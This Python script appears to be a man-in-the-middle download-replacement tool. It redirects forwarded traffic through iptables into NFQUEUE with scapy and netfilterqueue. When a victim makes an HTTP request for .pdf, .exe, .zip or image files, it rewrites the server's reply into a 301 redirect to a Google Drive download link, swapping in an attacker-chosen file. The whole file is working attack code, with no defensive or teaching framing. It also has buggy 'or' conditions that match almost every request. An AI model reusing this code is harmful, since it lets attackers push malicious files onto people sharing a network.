import subprocess
import time

import netfilterqueue
import scapy.all as scapy

ackList = []

subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', '0'])

def processPacket(packet):
    try:
        scapyPacket = scapy.IP(packet.get_payload())
        if scapyPacket.haslayer(scapy.Raw):
            if scapyPacket[scapy.TCP].dport == 80:
                if b'.pdf' in scapyPacket[scapy.Raw].load:
                    print('[+] Document Request')
                    ackList.append(scapyPacket[scapy.TCP].ack)
                    #print(scapyPacket.show())
                elif b'.exe' or b'.tar' in scapyPacket[scapy.Raw].load:
                    print('[+] exe Request')
                    ackList.append(scapyPacket[scapy.TCP].ack)
                elif b'.zip' or b'.rar' or b'.iso' in scapyPacket[scapy.Raw].load:
                    print('[+] Download Request')
                    ackList.append(scapyPacket[scapy.TCP].ack)
                elif b'.jpg' or b'.jpeg' or b'.png' in scapyPacket[scapy.Raw].load:
                    print('[+] image Request')
                    ackList.append(scapyPacket[scapy.TCP].ack)
                    #print(scapyPacket.show())


            elif scapyPacket[scapy.TCP].sport == 80:
                if scapyPacket[scapy.TCP].seq in ackList:
                    ackList.remove(scapyPacket[scapy.TCP].seq)
                    print('[+] Replacing File -->')
                    scapyPacket[scapy.Raw].load = 'HTTP/1.1 301 Moved Permanently\nLocation: https://drive.google.com/uc?export=download&id=0B4z20Qw5z2XQc3RhcnRlcl9maWxl\n\n'
                    del scapyPacket[scapy.IP].len
                    del scapyPacket[scapy.IP].chksum
                    del scapyPacket[scapy.TCP].chksum
                    temp = bytes(scapyPacket)
                    packet.set_payload(temp)



        packet.accept()

    except:
        print('',end='')


try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, processPacket)
    queue.run()
except KeyboardInterrupt:
    subprocess.call(['iptables', '--flush'])
    print("\nKeyboard Interrupt found!\nFlushing IP tables.....")
    time.sleep(1)
